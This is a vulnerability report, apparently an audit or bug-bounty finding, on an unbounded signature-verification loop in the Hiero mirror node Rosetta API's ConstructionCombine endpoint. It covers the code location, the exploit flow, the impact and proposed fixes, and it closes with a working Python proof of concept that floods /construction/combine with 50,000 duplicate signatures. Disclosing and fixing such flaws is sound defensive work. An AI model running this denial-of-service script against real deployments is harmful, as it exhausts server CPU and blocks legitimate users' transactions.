### Title
Unbounded Signature Loop in `ConstructionCombine` Enables CPU Exhaustion DoS

### Summary
`ConstructionCombine` in `rosetta/app/services/construction_service.go` iterates over every entry in `request.Signatures` with no upper-bound check, calling `ed25519.Verify` and `hiero.TransactionAddSignature` for each one. An unauthenticated attacker who controls both the `UnsignedTransaction` field and their own Ed25519 key pair can trivially produce a request containing thousands of copies of the same valid signature, forcing the server to perform thousands of expensive cryptographic operations per request with no application-level guard.

### Finding Description
**Exact location:** `rosetta/app/services/construction_service.go`, `ConstructionCombine()`, lines 58–87.

```go
// line 58 – only lower-bound check, no upper bound
if len(request.Signatures) == 0 {
    return nil, errors.ErrNoSignature
}
// ...
for _, signature := range request.Signatures {   // line 72 – unbounded
    // ...
    if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) {  // line 82
        return nil, errors.ErrInvalidSignatureVerification
    }
    _, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes)  // line 86
}
```

**Root cause:** The only guard on `request.Signatures` is the zero-length check at line 58. There is no maximum count, no deduplication, and no per-request work budget. The `ed25519.Verify` call (line 82) and `hiero.TransactionAddSignature` (line 86) are both invoked once per array element.

**Exploit flow:**
1. Attacker generates one Ed25519 key pair (trivial, offline).
2. Attacker crafts any syntactically valid `UnsignedTransaction` hex string (the transaction body bytes are derived from it via `getFrozenTransactionBodyBytes`).
3. Attacker signs those body bytes once, producing one valid `(pubKey, sig)` pair.
4. Attacker constructs a `ConstructionCombineRequest` JSON body with the same valid signature entry repeated N times (e.g., 50,000).
5. Attacker POSTs to `/construction/combine` — no authentication required.

**Why existing checks fail:**
- The `len == 0` guard (line 58) only prevents empty arrays.
- The `ed25519.Verify` check (line 82) does not stop the loop — it only returns early on an *invalid* signature. Because the attacker controls both the unsigned transaction and their own key, every copy of the signature is valid and the loop runs to completion.
- The HTTP server sets `ReadTimeout: 5s` and `WriteTimeout: 10s` (configured in `main.go` lines 220–227) but no `MaxBytesReader`. Over a fast connection (~100 Mbps), an attacker can deliver ~62 MB in 5 seconds. At ~400 bytes per JSON signature entry, that is ~150,000 signatures per request.
- The Traefik middleware (`charts/hedera-mirror-rosetta/values.yaml` lines 149–166) provides optional rate-limiting (`average: 10` req/s per host, `inFlightReq: 5` per IP), but this is a Kubernetes ingress configuration that is not present in the application itself and is not enforced when the service is accessed directly.

### Impact Explanation
Each `ed25519.Verify` call takes ~50–100 µs of CPU. 100,000 calls per request consumes 5–10 CPU-seconds. Concurrent requests (up to the in-flight limit, or unlimited if Traefik is absent) multiply this linearly. A single attacker with a fast connection can saturate server CPU, delaying or blocking all other Rosetta API operations including legitimate transaction gossip submissions via `/construction/submit`. Because the endpoint is stateless and offline-capable, it is reachable even in offline mode with no database dependency.

### Likelihood Explanation
The endpoint requires zero authentication or privilege. The attacker needs only: (a) network access to port 5700, (b) one self-generated Ed25519 key pair, and (c) any valid unsigned transaction hex (obtainable from a prior `/construction/payloads` call or crafted manually). The attack is repeatable, scriptable, and requires no on-chain funds or accounts. The Traefik rate-limit mitigates but does not eliminate the risk, and is absent in direct-access deployments.

### Recommendation
1. **Add an upper-bound check** immediately after the zero-length check:
   ```go
   const maxSignatures = 10 // or the maximum number of signers a Hiero tx can have
   if len(request.Signatures) > maxSignatures {
       return nil, errors.ErrTooManySignatures
   }
   ```
2. **Deduplicate signatures** by public key before the loop to prevent repeated work for the same signer.
3. **Apply `http.MaxBytesReader`** in the HTTP handler or middleware to cap request body size (e.g., 64 KB) independently of the read timeout.
4. Enforce the Traefik (or equivalent) rate-limiting and in-flight limits at the application layer, not only at the ingress layer.

### Proof of Concept
```python
import json, requests, hashlib
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

# 1. Generate key pair
priv = Ed25519PrivateKey.generate()
pub  = priv.public_key()

# 2. Use any valid unsigned_transaction hex from /construction/payloads
unsigned_tx = "<hex from /construction/payloads>"

# 3. Derive body bytes (same as getFrozenTransactionBodyBytes) and sign once
body_bytes = bytes.fromhex(unsigned_tx)[2:]  # simplified; real derivation via SDK
sig_bytes  = priv.sign(body_bytes)
pub_bytes  = pub.public_bytes_raw()

sig_entry = {
    "signing_payload": {
        "account_identifier": {"address": "0.0.100"},
        "hex_bytes": body_bytes.hex(),
        "signature_type": "ed25519"
    },
    "public_key": {"hex_bytes": pub_bytes.hex(), "curve_type": "edwards25519"},
    "signature_type": "ed25519",
    "hex_bytes": sig_bytes.hex()
}

# 4. Repeat the same valid signature 50,000 times
payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "unsigned_transaction": unsigned_tx,
    "signatures": [sig_entry] * 50000
}

# 5. Send — server will call ed25519.Verify + TransactionAddSignature 50,000 times
r = requests.post("http://<rosetta-host>:5700/construction/combine",
                  json=payload, timeout=60)
print(r.status_code, r.elapsed)
```
